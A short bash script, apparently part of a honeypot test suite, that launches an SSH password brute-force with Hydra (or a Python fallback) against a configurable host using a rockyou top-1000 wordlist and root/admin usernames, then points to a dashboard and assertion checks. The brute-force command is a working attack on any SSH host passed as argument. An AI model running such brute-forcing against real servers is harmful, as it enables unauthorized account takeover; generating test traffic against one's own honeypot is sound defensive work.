#!/usr/bin/env bash
# B5 - Bruteforce SSH avec Hydra (rockyou-top1000) contre le honeypot.
# Usage: bash attacks/run_ssh_bruteforce.sh [host] [port]
set -euo pipefail
HOST="${1:-127.0.0.1}"
PORT="${2:-2222}"
HERE="$(cd "$(dirname "$0")" && pwd)"
WORDLIST="$HERE/../datasets/rockyou-top1000.txt"

echo "[*] Hydra SSH bruteforce -> $HOST:$PORT (users: root,admin)"
if command -v hydra >/dev/null 2>&1; then
  hydra -L "$HERE/../datasets/users.txt" -P "$WORDLIST" -t 4 -f -V \
    "ssh://$HOST:$PORT" || true
else
  echo "[!] hydra absent -> fallback Python (paramiko-less, brute via ssh client si dispo)"
  python3 "$HERE/py_ssh_bruteforce.py" "$HOST" "$PORT" "$WORDLIST"
fi
echo "[+] Termine. Verifiez le dashboard et lancez: python3 attacks/assertions.py"
